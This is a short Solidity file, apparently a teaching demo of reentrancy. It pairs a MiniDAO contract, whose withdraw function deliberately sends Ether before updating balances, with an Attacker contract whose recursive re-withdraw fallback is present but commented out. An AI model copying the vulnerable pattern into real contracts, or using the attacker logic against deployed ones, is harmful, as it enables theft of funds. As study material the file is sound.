pragma solidity 0.4.24;

contract MiniDAO {
    mapping (address => uint) balances;

    function deposit() payable{
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) {
        if(balances[msg.sender] < amount) throw;
        //msg.sender.transfer(amount);
        msg.sender.call.value(amount)(abi.encodeWithSignature("forCall()", "MyName"));
        balances[msg.sender] -= amount;
    }
}

contract Attacker {

    // limit the recursive calls to prevent out-of-gas error
    uint stack = 0;
    uint constant stackLimit = 3;
    uint amount;
    MiniDAO dao;

    function Attacker(address daoAddress) payable {
        dao = MiniDAO(daoAddress);
        amount = msg.value/10;
        dao.deposit.value(msg.value)();
    }

    function attack(){
        dao.withdraw(amount);
    }
    function forCall()payable{}
    function() payable {
        //  if(stack++ < stackLimit) {
        //      dao.withdraw(amount);
        // }
    }
}